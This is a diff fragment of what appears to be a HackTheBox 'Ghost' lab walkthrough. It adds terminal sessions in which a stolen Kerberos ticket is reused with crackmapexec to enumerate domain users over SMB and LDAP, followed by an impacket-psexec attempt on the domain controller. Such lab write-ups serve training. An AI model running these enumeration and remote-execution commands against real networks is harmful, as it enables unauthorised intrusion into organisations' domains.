@@ -1039,9 +1039,34 @@ root@kali:~# crackmapexec smb DC01.ghost.htb --use-kcache
 SMB         ghost.htb       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
 SMB         ghost.htb       445    DC01             [+] ghost.htb\ from ccache
 
+root@kali:~# crackmapexec smb DC01.ghost.htb --use-kcache --users
+SMB         ghost.htb       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
+SMB         ghost.htb       445    DC01             [+] ghost.htb\ from ccache
+SMB         ghost.htb       445    DC01             [-] Error enumerating domain users using dc ip ghost.htb: NTLM needs domain\username and a password
+SMB         ghost.htb       445    DC01             [*] Trying with SAMRPC protocol
+
 root@kali:~# crackmapexec ldap DC01.ghost.htb --use-kcache
 SMB         ghost.htb       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
 LDAP        ghost.htb       389    DC01             [+] ghost.htb\florence.ramirez from ccache
+
+root@kali:~# crackmapexec ldap DC01.ghost.htb --use-kcache --users
+SMB         ghost.htb       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
+LDAP        ghost.htb       389    DC01             [+] ghost.htb\florence.ramirez from ccache
+LDAP        ghost.htb       389    DC01             [*] Total of records returned 18
+LDAP        ghost.htb       389    DC01             Administrator                  Built-in account for administering the computer/domain
+LDAP        ghost.htb       389    DC01             Guest                          Built-in account for guest access to the computer/domain
+LDAP        ghost.htb       389    DC01             krbtgt                         Key Distribution Center Service Account
+LDAP        ghost.htb       389    DC01             kathryn.holland
+LDAP        ghost.htb       389    DC01             cassandra.shelton
+LDAP        ghost.htb       389    DC01             robert.steeves
+LDAP        ghost.htb       389    DC01             florence.ramirez
+LDAP        ghost.htb       389    DC01             justin.bradley
+LDAP        ghost.htb       389    DC01             arthur.boyd
+LDAP        ghost.htb       389    DC01             beth.clark
+LDAP        ghost.htb       389    DC01             charles.gray
+LDAP        ghost.htb       389    DC01             jason.taylor
+LDAP        ghost.htb       389    DC01             intranet_principal
+LDAP        ghost.htb       389    DC01             gitea_temp_principal
 
 root@kali:~# impacket-psexec GHOST.HTB/florence.ramirez@DC01.ghost.htb -k -no-pass
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
